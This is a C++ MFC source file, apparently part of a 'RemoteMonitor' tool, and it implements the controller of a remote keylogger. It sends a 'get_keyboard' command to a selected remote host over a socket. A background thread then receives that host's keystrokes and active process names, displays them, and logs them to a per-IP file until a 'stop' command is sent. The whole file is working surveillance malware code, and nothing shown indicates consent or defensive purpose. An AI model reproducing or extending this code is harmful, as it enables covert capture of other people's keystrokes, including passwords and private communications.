// KeyboardSpyDlg.cpp: 实现文件
//

#include "pch.h"
#include "RemoteMonitor.h"
#include "RemoteMonitorDlg.h"
#include "KeyboardSpyDlg.h"
#include "afxdialogex.h"
#include <vector>
#include <string>
#include <fstream>
#include <iostream>
#include <thread>

using namespace std;

extern CRemoteMonitorDlg* pLogin;

KeyboardSpyDlg* pKeySpy;

string u82mb2(const char* cont)
{
	if (NULL == cont)
	{
		return "";
	}

	int num = MultiByteToWideChar(CP_UTF8, NULL, cont, -1, NULL, NULL);
	if (num <= 0)
	{
		return "";
	}
	wchar_t* buffw = new (std::nothrow) wchar_t[num];
	if (NULL == buffw)
	{
		return "";
	}
	MultiByteToWideChar(CP_UTF8, NULL, cont, -1, buffw, num);
	int len = WideCharToMultiByte(CP_ACP, 0, buffw, num - 1, NULL, NULL, NULL, NULL);
	if (len <= 0)
	{
		delete[] buffw;
		return "";
	}
	char* lpsz = new (std::nothrow) char[len + 1];
	if (NULL == lpsz)
	{
		delete[] buffw;
		return "";
	}
	WideCharToMultiByte(CP_ACP, 0, buffw, num - 1, lpsz, len, NULL, NULL);
	lpsz[len] = '\0';
	delete[] buffw;
	std::string rtn(lpsz);
	delete[] lpsz;
	return rtn;
}

//键盘监控线程
void keyboardSpyThread() {

	for (int i = 0;; i++)
	{
		char revData[1025];
		memset(revData, 0, 1024);

		CTime time;
		time = CTime::GetCurrentTime();
		CString time_str = time.Format("%Y年%m月%d日%H时%M分");

		CString filePath = "log\\" + pLogin->ip_addr_vec[pLogin->host_index - 1] + "\\keyboardRecord.txt";

		ofstream keyboardFile;
		keyboardFile.open(filePath, ios::app);
		if (!keyboardFile) {
			MessageBox(NULL,"error","error",0);
			return;
		}

		int res = recv(pLogin->clientSocket_vec[pLogin->host_index - 1], revData, 1024, 0);

		string record = u82mb2(revData);

		if (!strncmp(revData, "stop", sizeof("stop")))
		{
			break;
			return;
		}

		if (res > 0) {
			(pKeySpy->KeyBoardControlList).InsertItem(i, "");
			(pKeySpy->KeyBoardControlList).SetItemText(i, 0, time_str);
			(pKeySpy->KeyBoardControlList).SetItemText(i, 1, record.c_str());

			//判断键盘输入是否为功能键
			if (strcmp(revData, "Back") == 0 || strcmp(revData, "Space") == 0 || strcmp(revData, "Capital") == 0 ||
				strcmp(revData, "Lshift") == 0 || strcmp(revData, "Rshifit") == 0 || strcmp(revData, "Lcontrol") == 0 ||
				strcmp(revData, "Rcontrol") == 0 || strcmp(revData, "Lmenu") == 0 || strcmp(revData, "Rmenu") == 0 ||
				strcmp(revData, "Return") == 0 || strcmp(revData, "Tab") == 0)
			{
				if (i % 10 == 0)
				{
					keyboardFile << "[" << record << "]" << "\r\n";
				}
				else {
					keyboardFile << "[" << record << "]" << "\t";
				}
			}

			else if (revData[0] == '【' && revData[strlen(revData)-1] == '】') {
				keyboardFile << time_str << "\r\n";
				keyboardFile << "当前进程：" << record << "\r\n";
			}

			else {
				if (i % 10 == 0)
				{
					keyboardFile << record << "\r\n";
				}
				else {
					keyboardFile << record << "\t";
				}
			}
		}
		memset(revData, 0, 1024);
		keyboardFile.close();
	}
	return;
}

// KeyboardSpyDlg 对话框

IMPLEMENT_DYNAMIC(KeyboardSpyDlg, CDialogEx)

KeyboardSpyDlg::KeyboardSpyDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_DIALOG_KEYBOARD_SPY, pParent)
{

}

KeyboardSpyDlg::~KeyboardSpyDlg()
{
}

void KeyboardSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_KEYBOARD_CONTROL, KeyBoardControlList);
}


BEGIN_MESSAGE_MAP(KeyboardSpyDlg, CDialogEx)
	ON_BN_CLICKED(IDOK, &KeyboardSpyDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDC_BUTTON_STOP, &KeyboardSpyDlg::OnBnClickedButtonStop)
END_MESSAGE_MAP()


// KeyboardSpyDlg 消息处理程序


BOOL KeyboardSpyDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	pKeySpy = this;

	// TODO:  在此添加额外的初始化
	CRect rt;
	GetClientRect(&rt);
	KeyBoardControlList.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
	KeyBoardControlList.InsertColumn(0, "时间", LVCFMT_CENTER, rt.Width() / 2, 1);
	KeyBoardControlList.InsertColumn(1, "键盘输入", LVCFMT_CENTER, rt.Width() / 2, 1);
	//KeyBoardControlList.InsertColumn(1, "进程", LVCFMT_CENTER, rt.Width() / 3, 1);

	GetDlgItem(IDC_BUTTON_STOP)->SetWindowText("开始");

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void KeyboardSpyDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	CDialogEx::OnOK();

	//KeyBoardControlList.DeleteAllItems();
}


void KeyboardSpyDlg::OnBnClickedButtonStop()
{
	// TODO: 在此添加控件通知处理程序代码
	CString text;
	GetDlgItem(IDC_BUTTON_STOP)->GetWindowText(text);

	if (text == "开始") {
		KeyBoardControlList.DeleteAllItems();
		pLogin->sendLen_vec[pLogin->host_index - 1] = send(pLogin->clientSocket_vec[pLogin->host_index - 1], "get_keyboard", sizeof("get_keyboard"), 0);
		if (pLogin->sendLen_vec[pLogin->host_index - 1] == SOCKET_ERROR)
			MessageBox("send cmd error");

		thread task(keyboardSpyThread);
		task.detach();
		GetDlgItem(IDC_BUTTON_STOP)->SetWindowText("停止");
	}
	else if (text == "停止") {
		pLogin->sendLen_vec[pLogin->host_index - 1] = send(pLogin->clientSocket_vec[pLogin->host_index - 1], "stop", sizeof("stop"), 0);
		if (pLogin->sendLen_vec[pLogin->host_index - 1] == SOCKET_ERROR)
			MessageBox("send stop error");

		CDialogEx::OnCancel();
	}
}
